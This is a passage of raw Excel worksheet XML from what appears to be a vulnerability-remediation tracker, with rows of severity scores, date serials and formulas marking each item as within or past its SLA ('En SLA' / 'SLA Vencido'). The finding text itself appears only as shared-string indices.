    </row>
    <row r="512" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A512" s="5">
        <v>511</v>
      </c>
      <c r="B512" t="s">
        <v>32</v>
      </c>
      <c r="C512" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D512" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G512" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H512" t="s">
        <v>1903</v>
      </c>
      <c r="J512" t="s">
        <v>1325</v>
      </c>
      <c r="L512" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M512" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N512">
        <v>5.3</v>
      </c>
      <c r="Q512" t="s">
        <v>1796</v>
      </c>
      <c r="T512" s="1">
        <v>45913</v>
      </c>
      <c r="U512" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V512" s="1">
        <f t="shared" si="28"/>
        <v>46003</v>
      </c>
      <c r="W512" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB512" t="s">
        <v>1893</v>
      </c>
      <c r="AC512" t="s">
        <v>1790</v>
      </c>
      <c r="AG512" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="513" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A513" s="5">
        <v>512</v>
      </c>
      <c r="B513" t="s">
        <v>32</v>
      </c>
      <c r="C513" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D513" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G513" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H513" t="s">
        <v>1904</v>
      </c>
      <c r="J513" t="s">
        <v>574</v>
      </c>
      <c r="L513" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M513" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N513">
        <v>5.3</v>
      </c>
      <c r="Q513" t="s">
        <v>1796</v>
      </c>
      <c r="T513" s="1">
        <v>45913</v>
      </c>
      <c r="U513" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>296</v>
      </c>
      <c r="V513" s="1">
        <f t="shared" si="28"/>
        <v>46003</v>
      </c>
      <c r="W513" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB513" t="s">
        <v>1896</v>
      </c>
      <c r="AC513" t="s">
        <v>1794</v>
      </c>
      <c r="AG513" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="514" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A514" s="5">
        <v>513</v>
      </c>
      <c r="B514" t="s">
        <v>32</v>
      </c>
      <c r="C514" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D514" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G514" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H514" t="s">
        <v>1905</v>
      </c>
      <c r="J514" t="s">
        <v>1325</v>
      </c>
      <c r="L514" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M514" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N514">
        <v>5.3</v>
      </c>
      <c r="Q514" t="s">
        <v>1796</v>
      </c>
      <c r="T514" s="1">
        <v>45913</v>
      </c>
      <c r="U514" s="76">
        <f t="shared" ref="U514:U521" ca="1" si="30">TODAY()-T514</f>
        <v>296</v>
      </c>
      <c r="V514" s="1">
        <f t="shared" si="28"/>
        <v>46003</v>
      </c>
      <c r="W514" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB514" t="s">
        <v>1893</v>
      </c>
      <c r="AC514" t="s">
        <v>1790</v>
      </c>
      <c r="AG514" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="515" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A515" s="5">
        <v>514</v>
      </c>
      <c r="B515" t="s">
        <v>32</v>
      </c>
      <c r="C515" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D515" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G515" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H515" t="s">
        <v>1906</v>
      </c>
      <c r="J515" t="s">
        <v>574</v>
      </c>
      <c r="L515" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M515" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N515">
        <v>5.3</v>
      </c>
      <c r="Q515" t="s">
        <v>1796</v>
      </c>
      <c r="T515" s="1">
        <v>45913</v>
      </c>
      <c r="U515" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>296</v>
      </c>
      <c r="V515" s="1">
        <f t="shared" si="28"/>
        <v>46003</v>
      </c>
      <c r="W515" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB515" t="s">
        <v>1896</v>
      </c>
      <c r="AC515" t="s">
        <v>1794</v>
      </c>
      <c r="AG515" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="516" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A516" s="5">
        <v>515</v>
      </c>
      <c r="B516" t="s">
        <v>32</v>
      </c>
      <c r="C516" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D516" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G516" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H516" t="s">
        <v>1907</v>
      </c>
      <c r="J516" t="s">
        <v>1325</v>
      </c>
      <c r="L516" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M516" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N516">
        <v>5.3</v>
      </c>
      <c r="Q516" t="s">
        <v>1796</v>
      </c>
      <c r="T516" s="1">
        <v>45913</v>
      </c>
      <c r="U516" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>296</v>
      </c>
      <c r="V516" s="1">
        <f t="shared" si="28"/>
        <v>46003</v>
      </c>
      <c r="W516" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB516" t="s">
        <v>1893</v>
      </c>
      <c r="AC516" t="s">
        <v>1790</v>
      </c>
      <c r="AG516" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="517" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A517" s="5">
        <v>516</v>
      </c>
      <c r="B517" t="s">
        <v>32</v>
      </c>
      <c r="C517" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D517" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G517" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H517" t="s">
        <v>1908</v>
      </c>
      <c r="J517" t="s">
        <v>1325</v>
      </c>
      <c r="L517" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M517" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N517">
        <v>5.3</v>
      </c>
      <c r="Q517" t="s">
        <v>1796</v>
      </c>
      <c r="T517" s="1">
        <v>45913</v>
      </c>
      <c r="U517" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>296</v>
      </c>
      <c r="V517" s="1">
        <f t="shared" si="28"/>
        <v>46003</v>
      </c>
      <c r="W517" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB517" t="s">
        <v>1896</v>
      </c>
      <c r="AC517" t="s">
        <v>1794</v>
      </c>
      <c r="AG517" s="51" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="518" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A518" s="5">
        <v>517</v>
      </c>
      <c r="B518" t="s">
        <v>32</v>
      </c>
      <c r="C518" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D518" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G518" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H518" t="s">
        <v>1909</v>
      </c>
      <c r="J518" t="s">
        <v>971</v>
      </c>
      <c r="L518" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M518" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N518">
        <v>5.3</v>
      </c>
      <c r="Q518" t="s">
        <v>1391</v>
      </c>
      <c r="T518" s="1">
        <v>45913</v>
      </c>
      <c r="U518" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>296</v>
      </c>
      <c r="V518" s="1">
        <f t="shared" si="28"/>
        <v>46003</v>
      </c>
      <c r="W518" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB518" t="s">
        <v>1753</v>
      </c>
      <c r="AC518" t="s">
        <v>1754</v>
      </c>
      <c r="AG518" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="519" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A519" s="5">
        <v>518</v>
      </c>
      <c r="B519" t="s">
        <v>32</v>
      </c>
      <c r="C519" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D519" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G519" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H519" t="s">
        <v>1910</v>
      </c>
      <c r="J519" t="s">
        <v>971</v>
      </c>
      <c r="L519" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M519" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N519">
        <v>5.3</v>
      </c>
      <c r="Q519" t="s">
        <v>1395</v>
      </c>
      <c r="T519" s="1">
        <v>45913</v>
      </c>
      <c r="U519" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>296</v>
      </c>
      <c r="V519" s="1">
        <f t="shared" si="28"/>
        <v>46003</v>
      </c>
      <c r="W519" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB519" t="s">
        <v>1753</v>
      </c>
      <c r="AC519" t="s">
        <v>1754</v>
      </c>
      <c r="AG519" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="520" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A520" s="5">
        <v>519</v>
      </c>
      <c r="B520" t="s">
        <v>32</v>
      </c>
      <c r="C520" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D520" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G520" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H520" t="s">
        <v>1911</v>
      </c>
      <c r="J520" t="s">
        <v>574</v>
      </c>
      <c r="L520" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M520" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N520">
        <v>5.3</v>
      </c>
      <c r="Q520" t="s">
        <v>176</v>
      </c>
      <c r="T520" s="1">
        <v>45905</v>
      </c>
      <c r="U520" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>304</v>
      </c>
      <c r="V520" s="1">
        <f t="shared" si="28"/>
        <v>45995</v>
      </c>
      <c r="W520" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB520" t="s">
        <v>1893</v>
      </c>
      <c r="AC520" t="s">
        <v>1790</v>
      </c>
      <c r="AG520" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="521" spans="1:33" ht="246.5" x14ac:dyDescent="0.35">
      <c r="A521" s="5">
        <v>520</v>
      </c>
      <c r="B521" s="86" t="s">
        <v>32</v>
      </c>
      <c r="C521" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D521" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G521" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H521" t="s">
        <v>1912</v>
      </c>
      <c r="I521" t="s">
        <v>1913</v>
      </c>
      <c r="J521" t="s">
        <v>1914</v>
      </c>
      <c r="L521" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M521" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N521">
        <v>7.1</v>
      </c>
      <c r="Q521" t="s">
        <v>1915</v>
      </c>
      <c r="T521" s="1">
        <v>45939</v>
      </c>
      <c r="U521" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>270</v>
      </c>
      <c r="V521" s="1">
        <f t="shared" si="28"/>
        <v>45969</v>
      </c>
      <c r="W521" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB521" s="65" t="s">
        <v>1916</v>
      </c>
      <c r="AC521" s="65" t="s">
        <v>1917</v>
      </c>
      <c r="AD521" s="65" t="s">
        <v>1918</v>
      </c>
      <c r="AG521" s="65" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="522" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A522" s="5">
        <v>521</v>
      </c>
      <c r="B522" t="s">
        <v>32</v>
      </c>
      <c r="C522" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D522" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G522" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H522" t="s">
        <v>1919</v>
      </c>
      <c r="I522" t="s">
        <v>1920</v>
      </c>
      <c r="J522" t="s">
        <v>910</v>
      </c>
      <c r="L522" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M522" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N522">
        <v>3.6</v>
      </c>
      <c r="Q522" t="s">
        <v>1921</v>
      </c>
      <c r="T522" s="1">
        <v>45939</v>
      </c>
      <c r="V522" s="1">
        <f t="shared" si="28"/>
        <v>46029</v>
      </c>
      <c r="W522" s="76" t="str">
        <f t="shared" si="29"/>
        <v>En SLA</v>
      </c>
      <c r="AB522" s="65" t="s">
        <v>1922</v>
      </c>
      <c r="AC522" s="65" t="s">
        <v>1923</v>
      </c>
      <c r="AD522" s="65" t="s">
        <v>1924</v>
      </c>
      <c r="AG522" s="65" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="523" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A523" s="50">
        <v>522</v>
      </c>
      <c r="B523" t="s">
        <v>32</v>
      </c>
      <c r="C523" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D523" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G523" s="60" t="s">
        <v>1309</v>
      </c>
      <c r="H523" t="s">
        <v>1925</v>
      </c>
      <c r="J523" t="s">
        <v>1826</v>
      </c>
      <c r="L523" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M523" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N523">
        <v>4</v>
      </c>
      <c r="Q523" t="s">
        <v>1926</v>
      </c>
      <c r="T523" s="1">
        <v>45916</v>
      </c>
      <c r="U523" s="76">
        <f t="shared" ref="U523:U524" ca="1" si="31">TODAY()-T523</f>
        <v>293</v>
      </c>
      <c r="V523" s="1">
        <f t="shared" si="28"/>
        <v>46006</v>
      </c>
      <c r="W523" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
    </row>
    <row r="524" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A524" s="50">
        <v>523</v>
      </c>
      <c r="B524" t="s">
        <v>32</v>
      </c>
      <c r="C524" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D524" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G524" s="60" t="s">
        <v>1309</v>
      </c>
      <c r="H524" t="s">
        <v>1927</v>
      </c>
      <c r="J524" t="s">
        <v>1928</v>
      </c>
      <c r="L524" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M524" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N524">
        <v>4.8</v>
      </c>
      <c r="Q524" t="s">
        <v>1929</v>
      </c>
      <c r="T524" s="1">
        <v>45941</v>
      </c>
      <c r="U524" s="76">
        <f t="shared" ca="1" si="31"/>
        <v>268</v>
      </c>
      <c r="V524" s="1">
        <f t="shared" si="28"/>
        <v>46031</v>
      </c>
      <c r="W524" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
    </row>
    <row r="525" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A525" s="50">
        <v>524</v>
      </c>
      <c r="B525" t="s">
        <v>32</v>
      </c>
      <c r="C525" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D525" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G525" s="60" t="s">
        <v>1309</v>
      </c>
      <c r="H525" t="s">
        <v>1930</v>
      </c>
      <c r="J525" t="s">
        <v>1931</v>
      </c>
      <c r="L525" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M525" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N525">
        <v>4.8</v>
      </c>
      <c r="Q525" t="s">
        <v>1929</v>
      </c>
      <c r="T525" s="1">
        <v>45942</v>
      </c>
      <c r="V525" s="1">
        <f t="shared" si="28"/>
        <v>46032</v>
      </c>
      <c r="W525" s="76" t="str">
        <f t="shared" si="29"/>
        <v>En SLA</v>
      </c>
    </row>
    <row r="526" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A526" s="50">
        <v>525</v>
      </c>
      <c r="B526" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C526" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D526" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G526" s="60" t="s">
        <v>867</v>
      </c>
      <c r="I526" t="s">
        <v>1932</v>
      </c>
      <c r="J526" t="s">
        <v>1933</v>
      </c>
      <c r="L526" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M526" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N526">
        <v>3</v>
      </c>
      <c r="Q526" t="s">
        <v>977</v>
      </c>
      <c r="T526" s="1">
        <v>45939</v>
      </c>
      <c r="V526" s="1">
        <f t="shared" si="28"/>
        <v>46059</v>
      </c>
      <c r="W526" s="76" t="str">
        <f t="shared" si="29"/>
        <v>En SLA</v>
      </c>
      <c r="AB526" s="65" t="s">
        <v>1934</v>
      </c>
      <c r="AC526" s="65" t="s">
        <v>1935</v>
      </c>
      <c r="AD526" s="65" t="s">
        <v>1936</v>
      </c>
      <c r="AG526" s="65" t="s">
        <v>974</v>
      </c>
    </row>
    <row r="527" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A527" s="50">
        <v>526</v>
      </c>
      <c r="B527" t="s">
        <v>32</v>
      </c>
      <c r="C527" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D527" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G527" s="60" t="s">
        <v>1165</v>
      </c>
      <c r="H527" t="s">
        <v>1937</v>
      </c>
      <c r="I527" t="s">
        <v>1938</v>
      </c>
      <c r="J527" t="s">
        <v>1939</v>
      </c>
      <c r="L527" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M527" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N527">
        <v>8.3000000000000007</v>
      </c>
      <c r="Q527" t="s">
        <v>1940</v>
      </c>
      <c r="T527" s="1">
        <v>45953</v>
      </c>
      <c r="U527" s="76">
        <f t="shared" ref="U527" ca="1" si="32">TODAY()-T527</f>
        <v>256</v>
      </c>
      <c r="V527" s="1">
        <f t="shared" si="28"/>
        <v>45983</v>
      </c>
      <c r="W527" s="56" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB527" s="65" t="s">
        <v>1941</v>
      </c>
      <c r="AC527" s="65" t="s">
        <v>1942</v>
      </c>
      <c r="AD527" s="65" t="s">
        <v>1943</v>
      </c>
      <c r="AG527" s="65" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="528" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A528" s="50">
        <v>527</v>
      </c>
      <c r="B528" t="s">
        <v>32</v>
      </c>
      <c r="C528" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D528" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G528" s="60" t="s">
        <v>1165</v>
      </c>
      <c r="H528" t="s">
        <v>1944</v>
      </c>
      <c r="I528" t="s">
        <v>1945</v>
      </c>
      <c r="J528" t="s">
        <v>1946</v>
      </c>
      <c r="L528" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M528" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N528">
        <v>6.5</v>
      </c>
      <c r="Q528" t="s">
        <v>1947</v>
      </c>
      <c r="T528" s="1">
        <v>45953</v>
      </c>
      <c r="V528" s="1">
        <f t="shared" si="28"/>
        <v>46043</v>
      </c>
      <c r="W528" s="76" t="str">
        <f t="shared" si="29"/>
        <v>En SLA</v>
      </c>
      <c r="AB528" s="65" t="s">
        <v>1948</v>
      </c>
      <c r="AC528" s="65" t="s">
        <v>1942</v>
      </c>
      <c r="AD528" s="65" t="s">
        <v>1949</v>
      </c>
      <c r="AG528" s="65" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="529" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A529" s="50">
        <v>528</v>
      </c>
      <c r="B529" t="s">
        <v>32</v>
      </c>
      <c r="C529" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D529" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G529" s="60" t="s">
        <v>1165</v>
      </c>
      <c r="I529" t="s">
        <v>1950</v>
      </c>
      <c r="J529" t="s">
        <v>1951</v>
      </c>
      <c r="L529" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M529" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N529">
        <v>3.1</v>
      </c>
      <c r="Q529" t="s">
        <v>1947</v>
      </c>
      <c r="T529" s="1">
        <v>45953</v>
      </c>
      <c r="V529" s="1">
        <f t="shared" si="28"/>
        <v>46073</v>
      </c>
      <c r="W529" s="76" t="str">
        <f t="shared" si="29"/>
        <v>En SLA</v>
      </c>
      <c r="AB529" s="65" t="s">
        <v>1952</v>
      </c>
      <c r="AC529" s="65" t="s">
        <v>1953</v>
      </c>
      <c r="AD529" s="65" t="s">
        <v>1954</v>
      </c>
      <c r="AG529" s="65" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="530" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A530" s="50">
        <v>529</v>
      </c>
      <c r="B530" t="s">
        <v>32</v>
      </c>
      <c r="C530" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D530" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G530" s="60" t="s">
        <v>138</v>
      </c>
      <c r="I530" t="s">
        <v>1955</v>
      </c>
      <c r="J530" t="s">
        <v>890</v>
      </c>
      <c r="L530" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M530" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N530">
        <v>5.3</v>
      </c>
      <c r="Q530" t="s">
        <v>1956</v>
      </c>
      <c r="T530" s="1">
        <v>45953</v>
      </c>
      <c r="V530" s="1">
        <f t="shared" si="28"/>
        <v>46043</v>
      </c>
      <c r="W530" s="76" t="str">
        <f t="shared" si="29"/>
        <v>En SLA</v>
      </c>
      <c r="AB530" s="65" t="s">
        <v>1957</v>
      </c>
      <c r="AC530" s="65" t="s">
        <v>1958</v>
      </c>
      <c r="AD530" s="65" t="s">
        <v>1959</v>
      </c>
      <c r="AG530" s="65" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="531" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A531" s="50">
        <v>530</v>
      </c>
      <c r="B531" t="s">
        <v>32</v>
      </c>
      <c r="C531" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D531" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G531" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="H531" t="s">
        <v>1960</v>
      </c>
      <c r="I531" t="s">
        <v>1961</v>
      </c>
      <c r="J531" t="s">
        <v>1095</v>
      </c>
      <c r="L531" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M531" s="50" t="s">
        <v>42</v>
      </c>
      <c r="N531">
        <v>10</v>
      </c>
      <c r="Q531" s="65" t="s">
        <v>1962</v>
      </c>
      <c r="T531" s="1">
        <v>45959</v>
      </c>
      <c r="V531" s="1">
        <f t="shared" si="28"/>
        <v>45969</v>
      </c>
      <c r="W531" s="76" t="str">
        <f t="shared" si="29"/>
        <v>En SLA</v>
      </c>
      <c r="AB531" s="65" t="s">
        <v>1963</v>
      </c>
      <c r="AC531" s="65" t="s">
        <v>1964</v>
      </c>
      <c r="AD531" s="65" t="s">
        <v>1965</v>
      </c>
      <c r="AG531" s="65" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="532" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A532" s="50">
        <v>531</v>
      </c>
      <c r="B532" t="s">
        <v>32</v>
      </c>
      <c r="C532" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D532" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G532" s="60" t="s">
        <v>1539</v>
      </c>
      <c r="H532" t="s">
        <v>1966</v>
      </c>
      <c r="J532" t="s">
        <v>1271</v>
      </c>
      <c r="L532" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M532" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q532" t="s">
        <v>999</v>
      </c>
      <c r="T532" s="1">
        <v>45960</v>
      </c>
      <c r="U532" s="76">
        <f t="shared" ref="U532:U533" ca="1" si="33">TODAY()-T532</f>
        <v>249</v>
      </c>
      <c r="V532" s="1">
        <f t="shared" si="28"/>
        <v>46050</v>
      </c>
      <c r="W532" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB532" t="s">
        <v>1967</v>
      </c>
      <c r="AC532" t="s">
        <v>1968</v>
      </c>
      <c r="AG532" s="65" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="533" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A533" s="50">
        <v>532</v>
      </c>
      <c r="B533" t="s">
        <v>32</v>
      </c>
      <c r="C533" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D533" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G533" s="60" t="s">
        <v>138</v>
      </c>
      <c r="H533" t="s">
        <v>1969</v>
      </c>
      <c r="J533" t="s">
        <v>890</v>
      </c>
      <c r="L533" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M533" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q533" t="s">
        <v>1970</v>
      </c>
      <c r="T533" s="1">
        <v>45960</v>
      </c>
      <c r="U533" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>249</v>
      </c>
      <c r="V533" s="1">
        <f t="shared" si="28"/>
        <v>46050</v>
      </c>
      <c r="W533" s="76" t="str">
        <f t="shared" ca="1" si="29"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB533" t="s">
        <v>1971</v>
      </c>
      <c r="AC533" t="s">
        <v>1972</v>
      </c>
      <c r="AG533" s="65" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="534" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A534" s="50">
        <v>533</v>
      </c>
      <c r="B534" t="s">
        <v>32</v>
      </c>
      <c r="C534" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D534" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G534" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="H534" t="s">
        <v>1973</v>
      </c>
      <c r="J534" t="s">
        <v>1490</v>
      </c>
      <c r="L534" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M534" s="50" t="s">
        <v>522</v>
      </c>
      <c r="Q534" t="s">
        <v>1974</v>
      </c>
      <c r="T534" s="1">
        <v>45982</v>
      </c>
      <c r="V534" s="1">
        <f t="shared" si="28"/>
        <v>46012</v>
      </c>
      <c r="W534" s="76" t="str">
        <f t="shared" si="29"/>
        <v>En SLA</v>
      </c>
      <c r="AB534" t="s">
        <v>1975</v>
      </c>
      <c r="AC534" t="s">
        <v>1976</v>
      </c>
      <c r="AG534" s="65" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="535" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A535" s="50">
        <v>534</v>
      </c>
      <c r="B535" t="s">
        <v>32</v>
      </c>
      <c r="C535" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D535" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G535" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H535" t="s">
        <v>1977</v>
      </c>
      <c r="L535" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M535" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q535" t="s">
        <v>1978</v>
      </c>
      <c r="T535" s="1">
        <v>45976</v>
      </c>
      <c r="V535" s="1">
        <f t="shared" si="28"/>
        <v>46066</v>
      </c>
      <c r="W535" s="76" t="str">
        <f t="shared" si="29"/>
        <v>En SLA</v>
      </c>
      <c r="AB535" t="s">
        <v>1979</v>
      </c>
      <c r="AC535" t="s">
        <v>1980</v>
      </c>
      <c r="AG535" s="65" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="536" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A536" s="50">
        <v>535</v>
      </c>
      <c r="B536" t="s">
        <v>32</v>
      </c>
      <c r="C536" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D536" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G536" s="60" t="s">
        <v>1203</v>
      </c>
      <c r="H536" t="s">
        <v>1981</v>
      </c>
      <c r="I536" t="s">
        <v>1982</v>
      </c>
      <c r="J536" t="s">
        <v>1095</v>
      </c>
      <c r="L536" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M536" s="50" t="s">
        <v>42</v>
      </c>
      <c r="N536">
        <v>10</v>
      </c>
      <c r="Q536" t="s">
        <v>1983</v>
      </c>
      <c r="T536" s="1">
        <v>45988</v>
      </c>
      <c r="U536" s="76">
